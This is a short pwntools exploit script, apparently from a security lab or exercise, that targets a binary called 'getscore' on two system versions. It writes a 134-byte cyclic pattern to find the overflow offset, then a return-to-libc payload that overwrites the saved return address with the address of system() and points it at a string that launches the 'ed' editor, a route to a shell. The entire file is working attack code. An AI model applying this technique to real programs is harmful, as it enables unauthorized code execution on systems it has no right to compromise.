#!/usr/bin/env python2

import sys

from pwn import *

if sys.argv[1] == '8':
    context.binary = './getscore-rhl8'
    system = 0x42041e50
    ed = 0x8048346
elif sys.argv[1] == '9':
    context.binary = './getscore-rhl9'
    system = 0x4203f2c0
    ed = 0x8048346
else:
    raise ValueError('Argument 1 must be "8" or "9')

with open('payload1', 'wb') as f:
    f.write(cyclic(134)) # 0x86 chars

with open('payload2', 'wb') as f:
    f.write('a' +            # remaining offset
            'aaaa' +         # saved ebp
            pack(system) +   # ret to system
            'aaaa' +         # fake return address for system
            pack(ed)         # launch `ed`
    )
